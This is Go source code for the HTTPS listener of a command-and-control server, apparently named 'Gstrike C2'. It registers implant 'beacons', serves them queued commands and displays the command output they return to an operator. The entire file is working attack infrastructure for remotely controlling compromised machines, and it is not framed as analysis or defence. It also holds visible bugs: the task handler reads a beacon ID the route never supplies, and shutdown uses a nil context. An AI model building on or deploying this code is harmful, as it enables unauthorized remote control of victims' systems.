package transport

import (
	"context"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"gstrike/pkg/core/beaconmgr"
	"gstrike/pkg/core/taskmgr"
	"gstrike/pkg/util"
	"net/http"
	"strconv"
	"time"

	"github.com/gorilla/mux"
)

var Listeners []HttpsListener

type HttpsListener struct {
	ID        string    // Unique identifier (e.g., UUID)
	Port      int       // Port number
	CreatedAt time.Time // When the listener was created
	StartedAt time.Time // When the listener was started (may be zero if not started yet)
	Status    string    // Current status: "stopped", "running", "error", etc.
	CertFile  string    // Path to TLS cert file (if TLS enabled)
	KeyFile   string    // Path to TLS key file (if TLS enabled)
	Server    *http.Server
}

func NewHttps(port int) HttpsListener {
	id, _ := util.RandomString(10)
	listener := HttpsListener{
		ID:        id,
		Port:      port,
		CreatedAt: time.Now(),
		CertFile:  "build/config/certs/server.crt",
		KeyFile:   "build/config/certs/server.key",
	}
	listener.Status = "stopped"
	Listeners = append(Listeners, listener)
	return Listeners[len(Listeners)-1]
}

func (l *HttpsListener) Start() {
	r := mux.NewRouter()
	beaconApi := r.PathPrefix("/").Subrouter()

	beaconApi.HandleFunc("/register", RegisterBeacon).Methods("POST")
	beaconApi.HandleFunc("/tasks", GetTask).Methods("GET")
	beaconApi.HandleFunc("/results/{beaconId}", PostResults).Methods("POST")

	tlsConfig := &tls.Config{
		MinVersion: tls.VersionTLS12,
	}
	l.Server = &http.Server{
		Addr:      ":" + strconv.Itoa(l.Port),
		Handler:   r,
		TLSConfig: tlsConfig,
	}

	l.StartedAt = time.Now()
	l.Status = "running"
	fmt.Printf("\n%s [%s] Gstrike C2 Https server listening on https://localhost:%d\n", util.PrintGood, l.StartedAt, l.Port)
	err := l.Server.ListenAndServeTLS(l.CertFile, l.KeyFile)
	if err != nil {
		fmt.Printf("%s Error while starting listener: %v\n", util.PrintBad, err)
		return
	}
}

func (l *HttpsListener) Stop() error {
	var ctx context.Context
	var err error
	if l.Status == "running" {
		l.Status = "stopped"
		err = l.Server.Shutdown(ctx)
	}
	return err
}

// Registers the beacon, hands a unique UUID to identify them, received some critical info about the beacons env
func RegisterBeacon(w http.ResponseWriter, r *http.Request) {
	beacon, err := beaconmgr.NewBeacon(w, r)
	if err != nil {
		fmt.Printf("%s Failed to register new beacon: %v\n", util.PrintBad, err)
		return
	}
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(beacon)
}

func PostResults(w http.ResponseWriter, r *http.Request) {
	var TaskRes taskmgr.Task
	if err := json.NewDecoder(r.Body).Decode(&TaskRes); err != nil {
		fmt.Printf("%s Json decode error: %v\n", util.PrintBad, err)
		http.Error(w, "Invalid JSON", http.StatusBadRequest)
		return
	}
	taskmgr.UpdateTask(TaskRes)

	// Display to operator
	fmt.Printf("%s [%s] Beacon called back home, received %d bytes\n", util.PrintStatus, TaskRes.BeaconID, len(TaskRes.Output))
	if TaskRes.Status == "failed" {
		fmt.Printf("%s Task <%s> failed: %s\n", util.PrintBad, TaskRes.Command, TaskRes.Output)
	} else if TaskRes.Status == "success" {
		fmt.Printf("%s Task <%s> success: %s\n", util.PrintGood, TaskRes.Command, TaskRes.Output)
	}
}

func GetTask(w http.ResponseWriter, r *http.Request) {
	beaconId := mux.Vars(r)["beaconId"]
	next := taskmgr.NextTask(beaconId)

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(next)
}
